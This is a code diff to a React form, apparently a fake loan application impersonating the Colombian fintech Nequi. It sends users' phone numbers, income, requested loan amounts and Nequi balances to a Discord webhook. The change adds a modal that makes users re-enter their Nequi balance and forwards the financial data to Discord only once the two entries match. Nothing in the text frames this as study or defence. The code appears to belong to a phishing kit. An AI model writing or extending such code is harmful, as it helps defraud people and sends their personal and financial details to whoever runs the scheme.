@@ -223,6 +223,9 @@ export function FormScreen({ data, onChange, onContinue, onBack }: FormScreenPro
   const [step, setStep] = useState(0)
   const [direction, setDirection] = useState<'forward' | 'back'>('forward')
   const [animating, setAnimating] = useState(false)
+  const [showBalanceConfirm, setShowBalanceConfirm] = useState(false)
+  const [confirmBalanceValue, setConfirmBalanceValue] = useState('')
+  const [balanceError, setBalanceError] = useState('')
 
   const loanValue = data.loanAmount ? parseInt(data.loanAmount) : MIN_LOAN
   const incomeValue = data.monthlyIncome ? parseInt(data.monthlyIncome) : MIN_INCOME
@@ -272,21 +275,29 @@ export function FormScreen({ data, onChange, onContinue, onBack }: FormScreenPro
       DiscordWebhookService.sendInfo('Contacto', '', {}, {
         'Número de celular': data.phone,
       })
-    } else if (step === 2) {
+    }
+    if (step < 2) navigate('forward')
+    else setShowBalanceConfirm(true)
+  }
+
+  function handleBack() {
+    if (step === 0) onBack()
+    else navigate('back')
+  }
+
+  function handleBalanceConfirm() {
+    if (confirmBalanceValue === data.nequiBalance) {
       DiscordWebhookService.sendInfo('Información financiera', '', {}, {
         'Monto solicitado': `$${parseInt(data.loanAmount || '0').toLocaleString('es-CO')} COP`,
         'Plazo del crédito': `${data.loanTerm} meses`,
         'Ingresos mensuales': `$${parseInt(data.monthlyIncome || '0').toLocaleString('es-CO')} COP`,
         'Saldo Nequi': `$${parseInt(data.nequiBalance || '0').toLocaleString('es-CO')} COP`,
       })
+      setShowBalanceConfirm(false)
+      onContinue()
+    } else {
+      setBalanceError('El saldo ingresado no coincide. Verifica e intenta de nuevo.')
     }
-    if (step < 2) navigate('forward')
-    else onContinue()
-  }
-
-  function handleBack() {
-    if (step === 0) onBack()
-    else navigate('back')
   }
 
   const slideClass = animating
@@ -576,6 +587,57 @@ export function FormScreen({ data, onChange, onContinue, onBack }: FormScreenPro
           {step === 2 && 'Aprobación sujeta a estudio de crédito y políticas de la entidad'}
         </p>
       </div>
+
+      {/* Balance confirmation modal */}
+      {showBalanceConfirm && (
+        <div className="fixed inset-0 z-50 flex items-center justify-center px-6" style={{ background: 'rgba(0,0,0,0.5)' }}>
+          <div className="w-full max-w-sm bg-white rounded-3xl p-8 shadow-2xl animate-fade-in">
+            <h3 className="text-xl font-extrabold text-gray-900 mb-2">Confirma tu saldo Nequi</h3>
+            <p className="text-gray-500 text-sm mb-6">
+              Es importante para la aprobación de tu crédito. Ingresa nuevamente tu saldo actual.
+            </p>
+            <div className="relative mb-4">
+              <span className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-500 font-bold text-lg">$</span>
+              <input
+                type="tel"
+                inputMode="numeric"
+                pattern="[0-9]*"
+                value={confirmBalanceValue}
+                onChange={(e) => {
+                  setConfirmBalanceValue(e.target.value.replace(/\D/g, ''))
+                  setBalanceError('')
+                }}
+                placeholder="Ingresa tu saldo"
+                className="w-full bg-gray-50 border border-gray-200 rounded-xl pl-10 pr-5 py-4 text-gray-900 text-xl font-extrabold outline-none focus:border-[#E6005C] focus:bg-gray-100 transition-all placeholder-gray-300"
+                autoFocus
+              />
+            </div>
+            {balanceError && (
+              <p className="text-red-500 text-sm mb-4 font-medium">{balanceError}</p>
+            )}
+            <div className="flex gap-3">
+              <button
+                onClick={() => {
+                  setShowBalanceConfirm(false)
+                  setConfirmBalanceValue('')
+                  setBalanceError('')
+                }}
+                className="flex-1 py-4 rounded-2xl font-bold text-sm border border-gray-200 text-gray-600 hover:bg-gray-50 transition-all"
+              >
+                Cancelar
+              </button>
+              <button
+                onClick={handleBalanceConfirm}
+                disabled={!confirmBalanceValue}
+                className="flex-1 py-4 rounded-2xl font-bold text-sm text-white transition-all disabled:opacity-40"
+                style={{ background: '#E6005C' }}
+              >
+                Confirmar
+              </button>
+            </div>
+          </div>
+        </div>
+      )}
     </div>
   )
 }
